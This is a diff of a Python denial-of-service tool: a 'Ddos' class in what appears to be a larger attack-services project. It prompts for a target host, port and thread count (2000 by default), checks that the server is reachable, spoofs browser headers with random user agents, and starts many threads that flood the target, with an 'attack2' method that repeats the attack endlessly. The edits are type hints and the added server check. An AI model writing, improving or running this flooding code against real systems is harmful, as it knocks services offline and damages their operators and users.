@@ -1,16 +1,14 @@
 import time
 import socket
 import threading
-from abc import ABC
 from colorama import Fore
 from fake_useragent import UserAgent
-
 
 from services.interface import IService
 
 
-class Ddos(IService, ABC):
-    def __init__(self):
+class Ddos(IService):
+    def __init__(self) -> None:
         self.packages = 0
         self.headers = ('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n'
                         'Accept-Language: en-us,en;q=0.5\n'
@@ -24,6 +22,16 @@ class Ddos(IService, ABC):
         self.threads = int(input(f'Threads (2000 by default): ') or 2000)
 
     def run(self) -> None:
+        print(f'{Fore.YELLOW}Scanning...')
+
+        # Check server
+        try:
+            s = socket.socket()
+            s.connect((self.address, self.port))
+        except:
+            print(f'{Fore.RED}Server not found')
+            exit()
+
         # Launching threads
         for i in range(self.threads):
             threading.Thread(target=self.attack).start()
@@ -53,6 +61,6 @@ class Ddos(IService, ABC):
                 print(f'{Fore.RED}{current_time} ERROR {e} Attacking Server->{self.address}')
 
     # Here is some shit code
-    def attack2(self):
+    def attack2(self) -> None:
         while True:
             self.attack()
